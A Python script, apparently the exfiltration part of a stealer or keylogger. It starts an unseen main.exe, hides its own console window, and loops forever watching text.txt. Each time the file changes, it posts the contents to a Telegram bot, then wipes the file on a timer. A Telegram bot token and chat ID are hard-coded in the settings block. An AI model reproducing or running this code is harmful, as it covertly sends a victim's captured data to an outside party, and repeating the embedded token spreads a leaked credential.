import os
import time
import requests
import subprocess
import ctypes
import threading

os.system("color 0C")

scarytext = "STAYAWAY"

for _ in range(40):
    for _ in range(30):
        print(scarytext, end="")
    print()
time.sleep(1.5)

os.system("cls")

# Очистить файл при запуске
with open("text.txt", "w", encoding="utf-8"):
    pass

# ==========================
# Настройки
# ==========================

TOKEN = "8966224967:AAHBvkf7pxG6AO3uqZa3hlSzMU6Qu6TjzM8"
CHAT_ID = "1879557622"

# ==========================
# Функция отправки
# ==========================

FILE = os.path.join(
    os.path.dirname(__file__),
    "text.txt"
)

main_process = subprocess.Popen(
    ["cmd", "/c", "start", "main.exe"],
    cwd=os.path.dirname(__file__)
)


print("main.exe found")

time.sleep(1)

#watcherpy starts working
print("looking...")

print("searching for:", FILE)
print("FOUND", FILE)

def send_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

    requests.post(
            url,
        data={
            "chat_id": CHAT_ID,
            "text": text[:4000]  # Telegram ограничивает длину сообщения
        },
        timeout=10
    )

time.sleep(5)

hwnd = ctypes.windll.kernel32.GetConsoleWindow()
ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE

# ==========================
# Отслеживание файла
# ==========================

print("Is real?:", os.path.exists(FILE))

last_modified = 0
last_text = ""

while True:
    try:
        if os.path.exists(FILE):
            modified = os.path.getmtime(FILE)

            if modified != last_modified:
                last_modified = modified

                with open(FILE, "r", encoding="utf-8") as f:
                    text = f.read()

                if text != last_text:
                    last_text = text
                    send_message(text)
                    print("Данные отправлены")


                    def clear_text():
                        while True:
                            time.sleep(60)  # ждать 60 секунд
                            try:
                                with open("text.txt", "w", encoding="utf-8") as f:
                                    pass  # очищаем файл
                            except Exception as e:
                                print("Ошибка очистки:", e)
                                
                    threading.Thread(target=clear_text, daemon=True).start()

        time.sleep(1)

    except Exception as e:
        print(e)
        time.sleep(5)